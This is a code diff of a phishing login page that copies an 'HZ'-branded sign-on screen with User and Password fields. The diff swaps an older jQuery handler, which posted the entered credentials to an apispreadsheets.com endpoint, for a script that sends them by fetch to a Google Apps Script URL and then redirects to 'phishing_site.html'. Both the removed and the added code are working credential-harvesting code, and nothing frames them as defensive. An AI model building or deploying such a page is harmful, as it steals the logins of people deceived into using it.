@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -14,6 +15,7 @@
         }
     </style>
 </head>
+
 <body>
     <div class="main_div">
         <div class="sideImg">
@@ -28,19 +30,17 @@
             <img class="hzl" src="/HZ_logo.png" alt="HZ logo">
 
             <div class="login"> <br> <br> <br>
-                <form onsubmit="phishingPage()" id="myForm">
-                    
-                <div class="display_flex">
-                    <div class="text"> <label>User</label> <span style="color: red;"> *</span> </div>
-                    <div ><input class="input" type="number" name="User" required/> </div>
-                </div>
-                <div class="display_flex">
-                    <div class="text"><label>Password</label> <span style="color: red;"> *</span> </div>
-                    <div ><input class="input" type="password" name="Password" required /> </div>
-                </div>
-                <div class="btn"><button onsubmit="phishingPage()" >Log On</button></div>  
-            </form>
-            
+                <form id="form">
+                    <div class="display_flex">
+                        <div class="text"> <label>User</label> <span style="color: red;"> *</span> </div>
+                        <div><input class="input" type="number" name="user" required /> </div>
+                    </div>
+                    <div class="display_flex">
+                        <div class="text"><label>Password</label> <span style="color: red;"> *</span> </div>
+                        <div><input class="input" type="password" name="password" required /> </div>
+                    </div>
+                    <div class="btn"><input class="logOnBtn" type="submit" name="submit" value="Log On" /></div>
+                </form>
             </div>
 
             <div class="notice">
@@ -57,28 +57,29 @@
             </div>
         </div>
     </div>
+    <script>
+        const form = document.querySelector("#form")
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbxApNN9Yv3yjm2loEvYi5P2DkpA0f9B2EK6TP9T2RC1WlphpkaCOxvPxzXyc90Ij3dy/exec'
+
+        form.addEventListener('submit', e => {
+            e.preventDefault()
+            let requestBody = new FormData(form)
+            console.log(requestBody)
+            fetch(scriptURL, { method: 'POST', body: requestBody })
+                .then(response => {
+                    submission();
+                })
+                .catch(error => {
+                    alert('Error!', error.message)
+                }
+                )
+        })
+        function submission(a) {
+            location.href = 'phishing_site.html';
+        }
+    </script>
 </body>
+
 </html>
-<script
-		src="https://code.jquery.com/jquery-3.4.1.js"
-		integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
-		crossorigin="anonymous"></script>
-<script>
-    var form = document.getElementById("myForm").addEventListener("submit", (e)=>{
-        phishingPage(e);
-    })
-    function phishingPage(e){
-        e.preventDefault() ;    
-        $.ajax({
-				url:"https://api.apispreadsheets.com/data/pU1aMUfnVSJKvxm3/",
-				type:"post",
-				data:$("#myForm").serializeArray(),
-				success: function(){
-					window.location = "phishing_site.html"
-				},
-				error: function(){
-					alert("There was an error :(")
-				}
-			});   
-    }
-</script>
+<script src="https://code.jquery.com/jquery-3.4.1.js" integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
+    crossorigin="anonymous"></script>
